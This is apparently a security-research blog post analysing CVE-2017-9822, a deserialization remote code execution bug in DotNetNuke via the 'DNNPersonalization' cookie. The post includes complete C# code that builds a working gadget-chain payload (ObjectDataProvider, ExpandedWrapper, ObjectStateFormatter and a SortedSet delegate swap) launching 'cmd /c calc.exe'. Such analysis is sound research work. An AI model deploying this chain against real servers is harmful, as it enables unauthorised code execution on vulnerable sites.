---
layout: post
title:  "CVE-2017-9822 Analysis"
---

## Introduction
[DotNetNuke](https://www.dnnsoftware.com/), or DNN in short, is an open source web content-management-system (CMS), developed in the C# language.<br/>
On 2017 May 7, [DotNetNuke’s Security Center](https://www.dnnsoftware.com/community/security/security-center) added a security issue regarding a Pre-Auth RCE which was discovered within the System, tagged as CVE-2017-9822.<br/>
In this article I have performed a deep technical analysis of this vulnerability, how it works and how to exploit it.<br/>

## System Setup
DNN provides an installation package that comes as a zip file containing all of the required files and directories which are needed to deploy and run DNN on top of an IIS server, which made installing DNN quite straightforward<br/>
I started by downloading a vulnerable version so I could trigger the vulnerability, from there all I had left to do was to unzip the installation package into a directory accessible in RW privileges by the IIS user and create a new website within IIS having it’s webroot pointing to that directory.<br/>
On the first web access to DNN, an installation procedure is prompted and must be completed in order to configure settings like the SQL-Server connection and the Admin login credentials.<br/>
When finished I was able to access the system’s web interface.

![welcomePage](/assets/img/welcome_page.png)

Which was the entry point for the vulnerability.

## The Vulnerability
The PreAuth-RCE vulnerability occurs due to an XML deserialization of user-controlled data.
The vulnerable sink resides within the `PersonalizationController` Class which is responsible for handling user personalization data including unauthenticated visitors and is triggered when a 404-page is served to the user.<br/>
`PersonalizationController` loads a user profile using its `LoadProfile` method, which for unauthenticated users fetches the data from the `"DNNPersonalization"` cookie, and without any sanitization whatsoever passes it to `DeserializeHashTableXml` to initialize the Profile `HashTable`:

```csharp
public PersonalizationInfo LoadProfile(int userId, int portalId)
{
    // ...

    // Fetch DNNPersonalization cookie data
    text = current.Request.Cookies["DNNPersonalization"].Value;
    // Call DeserializeHashTableXml
    personalizationInfo.Profile = (string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text));
    return personalizationInfo;
}
```

The `DeserializeHashTableXml` is responsible for parsing the XML and building the Profile `HashTable`.
`DeserializeHashTableXml` parses the XML and iterates over the `"item"` elements under the `"profile"` root element, where each `"item"` element is expected to contain a `"key`" and a `"type"` attributes.<br/>
Then for each `"item"` element an `XmlSerializer` is constructed for the specified object type, using the `"key"` attribute, and `XmlSerializer::Deserialize` is called on the element’s inner data.

```java
public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
{
   // ...

   // Iterate over each "item" element
   foreach (XmlElement item in xmlDocument.SelectNodes(rootname + "/item"))
   {        
        string keyAttr = item.GetAttribute("key");
        // Fetch object type
        string typeAttr = item.GetAttribute("type");
        // Construct XmlSerializer for the specified type
        XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(typeAttr));
        XmlTextReader xmlReader = new XmlTextReader(new StringReader(item.InnerXml));
        // Deserialize data
        hashtable.Add(keyAttr, xmlSerializer.Deserialize(xmlReader));
   }
}
```

Seeing this I was amazed, they provided a way of deserializing an arbitrary object using `XmlSerializer`.
For example in order to deserialize an integer of the value 5, and save it within the `HashTable` using the key `"MySpecialInteger"`, I would need to use the following XML:

```xml
<?xml version="1.0" encoding="utf-8"?>
<profile>
	<item key="MySpecialInteger" type="System.Int32">
	<int>5</int>
</item>
</profile>
```

![SystemInt32POC](/assets/img/SystemInt32POC.PNG)

## From Deserialization To RCE

When an object is being deserialized it is being restored to its original form from when it was originally serialized, and in that procedure the `XmlSerializer` will use the given values from the XML to set all of the object’s public variables and to call all of the object’s property setters.<br/>
Calling the setters introduces a way to create a deserialization code flow, also known as a gadget-chain, and specifically a code flow where eventually the last gadget will produce remote code execution.<br/>
Unfortunately in contrast to some other `.NET` serializers and formatters `XMLSerializer` presents some limitations.<br/>

1. Cannot deserialize objects with interface variables.
2. Cannot deserialize objects with variables which their type is only known at runtime.

However these adversities can be overcome with enough effort and creativity.

One of the most widely used `.NET` Class for constructing deserialization gadget-chains is the `ObjectDataProvider` Class, as this class allows for calling arbitrary methods with a set of arbitrary parameters on an arbitrary object using only its setters!<br/>
This class contains property setters for:

1. ObjectInstance - The object to operate on.
2. MethodParam - The list of parameters to pass to the method.
3. MethodName - The name of the method to invoke.

The internal flow from setting the setters all the way to the [InvokeMember](https://learn.microsoft.com/en-us/dotnet/api/system.type.invokemember) call on the object can be visualized using the diagram given in the BlackHat talk “Friday the 13th: JSON Attacks”:

![BlackHatObjectDataProviderFlow](/assets/img/BlackHatObjectDataProviderFlow.PNG)

Wow it seems as if this Class was specially designed for deserialization RCEs, thanks Microsoft ;)<br/><br/>
If you recall the second obstacle with `XmlSerializer`, it is that it cannot deserialize variables which their type is known only at runtime, and this is exactly the case with the `ObjectInstance` variable of the `ObjectDataProvider` Class, which is originally declared as an `Object`.<br/>
This could be bypassed using another cool `.NET` class, the `ExpandedWrapper` Class. This class allows for declaring ahead of runtime the type of the object which is encapsulated within by wrapping it with runtime type information, giving `XmlSerializer` the information it needs.

I was getting closer and closer to completing the gadget-chain and it felt like the right time to start looking into gadgets which would introduce controlled code execution, `.NET` provides the `System.Diagnostics.Process` Class which, from the official documentation, provides access to local and remote processes and enables you to start and stop local system processes.<br/>
Sounds like a great gadget for executing code on the system does it not?<br/>
Well not so fast, the Process Class contains interface variables and therefore could not be used with the XmlSerializer.<br/>
However as I’ve seen in previous `.NET` deserialization exploits, it can indeed be used with the `ObjectStateFormatter` Class which is used for deserializing the `ViewState` in `ASP.NET`.<br/>
Therefore using `ObjectStateFormatter` I could embed a second deserialization call as part of the gadget chain which would allow me to achieve RCE.<br/><br/>

`ObjectStateFormatter` comes with its own limitations as it can only serialize Classes which have the `SerializableAttribute` applied to them.<br/>
One of these classes is the `SortedSet<T>` Class, a `Serializable` Class which represents a collection of objects that is maintained in a sorted order.<br/>
When a `SortedSet` is being deserialized it calls an inner `IComparer` which holds an inner `delegate` in order to sort the objects.<br/>
This was beautifully abused by [James Forshaw](https://twitter.com/tiraniddo?lang=en), a researcher from project zero, who by manipulating the inner comparison method of the SortedSet thorough a MulticastDelegate with a Process.Start as one of its delegates, was able to trigger code execution during a SortedSet deserialization.<br/>
The following diagram from James’ blog post illustrates the idea:<br/>

![SortedSetAbuseFlowImage](/assets/img/SortedSetAbuseFlowImage.png)

From here it was a matter of building the gadget-chain payload, I’ve provided my code with comments in order to provide a descriptive flow of the steps.<br/>

```csharp
/* --- #1 ---
 * Serialize a payload for ObjectStateFormatter via a manipulated SortedSet<T> for triggering RCE
 * through Process::Start 
 */
// Create a regular string comparison delegate
 Delegate strCompareDelegate = new Comparison<string>(String.Compare);
// Create a multicast delegate from the string comparison delegate.
// Delegates must be of the same type during initialization of the multicast.
Comparison<string> multiStrCompareDelegate = (Comparison<string>)MulticastDelegate.Combine(strCompareDelegate, strCompareDelegate);
// Create a Comparer using the MulticastDelegate
IComparer<string> multiComparer = Comparer<string>.Create(multiStrCompareDelegate);
// Create a SortedSet<string> using the Comparer
SortedSet<string> set = new SortedSet<string>(multiComparer);
// Add the items to the collection
// Will later be used as arguments for Process::Start(string fileName, string arguments)
set.Add("cmd");
set.Add("/c calc.exe");
// Fetch the initial invocationList 
object[] invokeList = multiStrCompareDelegate.GetInvocationList();
// Manipulate the invocationList to contain Process::Start
invokeList[1] = new Func<string, string, Process>(Process.Start);
// Modify the private _invocationList variable through the FieldInfo API
FieldInfo fieldInfo = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
fieldInfo.SetValue(multiStrCompareDelegate, invokeList);

// Serialize the manipulated SortedSet<string> through ObjectStateFormatter
string osfPayload = new ObjectStateFormatter().Serialize(set);


/* --- #2 ---
 * Wrap ObjectStateFormatter with ObjectDataProvider for triggering ObjectStateFormatter::Deserialize
 * when ran through XmlSerializer::Deserialize
 */
ObjectDataProvider odp = new ObjectDataProvider();
odp.ObjectInstance = new ObjectStateFormatter();
odp.MethodParameters.Add(osfPayload);
odp.MethodName = "Deserialize";

/* --- #3 ---
 * Wrap ObjectDataProvider with ExtendedWrapper for runtime type information
 */
ExpandedWrapper<ObjectStateFormatter, ObjectDataProvider> ep = new ExpandedWrapper<ObjectStateFormatter, ObjectDataProvider>();
ep.ProjectedProperty0 = odp;

/* --- #4 ---
 * Serialize final XML payload via XmlSerialize::Serialize
 */
XmlSerializer xmlSerializer = new XmlSerializer(ep.GetType());
StringWriter sw = new StringWriter();
xmlSerializer.Serialize(sw, ep);
sw.Close();
Console.WriteLine("AQN Type: " + ep.GetType().AssemblyQualifiedName);
Console.WriteLine(sw.ToString());
```

The general flow of the gadget-chain can be visualized like the following:

![GadgetChainGeneralFlow](/assets/img/GadgetChainGeneralFlow.png)

Remote Code Execution POC:

![CVE-2017-9822-POC-Final](/assets/img/CVE-2017-9822-POC-Final.gif)